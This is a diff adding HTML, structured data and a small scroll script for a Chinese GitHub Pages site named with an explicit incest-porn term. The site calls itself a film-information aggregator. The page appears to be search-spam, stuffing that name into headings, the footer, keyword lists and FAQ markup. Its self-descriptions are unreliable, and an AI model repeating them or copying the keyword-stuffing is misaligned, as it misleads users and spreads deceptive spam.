+        <dd>本站仅提供影视信息聚合、剧情介绍、影视榜单与观影资讯，不提供任何影片的在线播放或下载服务，观看正片请通过合法授权的视频平台。</dd>
+      </dl>
+    </div>
+  </section>
+
+  <!-- 栏目七：关于本站（三栏留白） -->
+  <section class="sec" id="about">
+    <div class="wrap">
+      <div class="sec-top">
+        <span class="ord">陆<small>ABOUT</small></span>
+        <div>
+          <h2>关于本站 · 乱伦电影网</h2>
+          <p>以内容与体验为核心，坚持每日更新，为影迷提供稳定可靠的影视信息服务平台。</p>
+        </div>
+      </div>
+      <div class="about">
+        <div class="col">
+          <h3>我们做什么</h3>
+          <p>整合全网优质影视信息，输出分类导航、剧情速览、影视榜单与行业资讯，让找片这件事变得简单。</p>
+          <ul>
+            <li><b>甲</b><span>影视分类导航与题材筛选</span></li>
+            <li><b>乙</b><span>每日更新的精选片单</span></li>
+            <li><b>丙</b><span>基于热度与评分的榜单</span></li>
+            <li><b>丁</b><span>原创影视资讯与观影攻略</span></li>
+          </ul>
+        </div>
+        <div class="col">
+          <h3>我们的特点</h3>
+          <p>轻量页面与移动端优先的设计理念，让浏览体验始终保持流畅稳定。</p>
+          <ul>
+            <li><b>甲</b><span>响应式布局，手机端自适应</span></li>
+            <li><b>乙</b><span>栏目清晰，三步内找到影片</span></li>
+            <li><b>丙</b><span>编辑人工复核，拒绝低质堆砌</span></li>
+            <li><b>丁</b><span>榜单与资讯每日同步</span></li>
+          </ul>
+        </div>
+        <div class="col">
+          <h3>站点信息</h3>
+          <p>如有内容合作、意见反馈或版权相关问题，可通过站内反馈通道与我们联系。</p>
+          <ul>
+            <li><b>名</b><span>站点名称：乱伦电影网</span></li>
+            <li><b>址</b><span>luanlundianyingwang-cn.github.io</span></li>
+            <li><b>时</b><span>服务时间：每日 09:00 - 22:00</span></li>
+            <li><b>联</b><span>反馈入口：站内留言通道</span></li>
+          </ul>
+        </div>
+      </div>
+      <div class="creed">
+        <h2>现在就来乱伦电影网<br><em>找到你的下一部好片</em></h2>
+        <p>https://luanlundianyingwang-cn.github.io</p>
+        <a class="btn" href="#">立即进入乱伦电影网</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="fcols">
+      <div class="fbrand">
+        <div class="nm"><i aria-hidden="true">伦</i>乱伦电影网</div>
+        <p>精选影视片单 · 热门影视榜单 · 分类导航 · 影视资讯，移动端自适应，随时随地发现好片。</p>
+        <div class="u">https://luanlundianyingwang-cn.github.io</div>
+      </div>
+      <div>
+        <h4>Content</h4>
+        <a href="#picks">精选片单</a>
+        <a href="#board">热门榜单</a>
+        <a href="#seals">分类导航</a>
+        <a href="#press">影视资讯</a>
+      </div>
+      <div>
+        <h4>Navigate</h4>
+        <a href="#qa">观影问答</a>
+        <a href="#about">关于本站</a>
+        <a href="#home">返回首页</a>
+        <a href="#">意见反馈</a>
+      </div>
+      <div>
+        <h4>Info</h4>
+        <a href="#">版权声明</a>
+        <a href="#">隐私政策</a>
+        <a href="#">健康观影</a>
+        <a href="#">友情链接</a>
+      </div>
+    </div>
+    <p class="fend">&copy; 2026 乱伦电影网（https://luanlundianyingwang-cn.github.io）版权所有 · 影视信息聚合与推荐平台</p>
+    <p class="fkw">热门关键词：乱伦电影网、电影网、精选影视片单、热门影视榜单、新片速递、高分电影推荐、影视资讯、追剧指南</p>
+  </div>
+</footer>
+
+<div id="top" role="button" tabindex="0" aria-label="返回顶部">&#9650;</div>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://luanlundianyingwang-cn.github.io/#website",
+      "url": "https://luanlundianyingwang-cn.github.io/",
+      "name": "乱伦电影网",
+      "description": "乱伦电影网提供精选影视片单、热门影视榜单、新片速递与影视资讯解读，每日更新高分佳作。",
+      "inLanguage": "zh-CN"
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://luanlundianyingwang-cn.github.io/#organization",
+      "url": "https://luanlundianyingwang-cn.github.io/",
+      "name": "乱伦电影网",
+      "description": "影视信息聚合与推荐平台，提供影视分类导航、热门影视榜单、新片速递与影视资讯。"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {"@type":"ListItem","position":1,"name":"首页","item":"https://luanlundianyingwang-cn.github.io/"},
+        {"@type":"ListItem","position":2,"name":"精选片单","item":"https://luanlundianyingwang-cn.github.io/#picks"},
+        {"@type":"ListItem","position":3,"name":"热门榜单","item":"https://luanlundianyingwang-cn.github.io/#board"},
+        {"@type":"ListItem","position":4,"name":"影视资讯","item":"https://luanlundianyingwang-cn.github.io/#press"}
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "乱伦电影网是什么类型的网站？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "乱伦电影网是一个影视信息聚合与推荐平台，提供精选电影、热播剧集、动漫综艺的分类浏览、剧情介绍、影视榜单与影视资讯。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "乱伦电影网的官方网址是什么？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "乱伦电影网官方网址为 https://luanlundianyingwang-cn.github.io ，建议收藏本站以获取稳定、最新的影视推荐服务。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "乱伦电影网手机端可以正常使用吗？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "可以，乱伦电影网采用响应式布局，片单、榜单与资讯在手机端会自动重排为单列结构，导航收起为顶部目录，竖屏浏览同样顺畅。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "乱伦电影网的影视榜单多久更新一次？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "精选片单与热门榜单每日依据播放热度与站内评分刷新，影视资讯则随新片定档与行业动态同步更新。"
+          }
+        }
+      ]
+    }
+  ]
+}
+</script>
+
+<script>
+(function(){
+  var top = document.getElementById('top');
+  function onScroll(){
+    var y = window.pageYOffset || document.documentElement.scrollTop;
+    if (y > 300) { top.classList.add('show'); } else { top.classList.remove('show'); }
+  }
+  window.addEventListener('scroll', onScroll, {passive:true});
+  onScroll();
+  function toTop(){ window.scrollTo({top:0, behavior:'smooth'}); }
+  top.addEventListener('click', toTop);
+  top.addEventListener('keydown', function(e){ if(e.key === 'Enter' || e.key === ' '){ e.preventDefault(); toTop(); } });
+  var box = document.getElementById('menu-state');
+  var links = document.querySelectorAll('.navmob a');
+  for (var i = 0; i < links.length; i++){
+    links[i].addEventListener('click', function(){ box.checked = false; });
+  }
+})();
+</script>
+
+</body>
+</html>
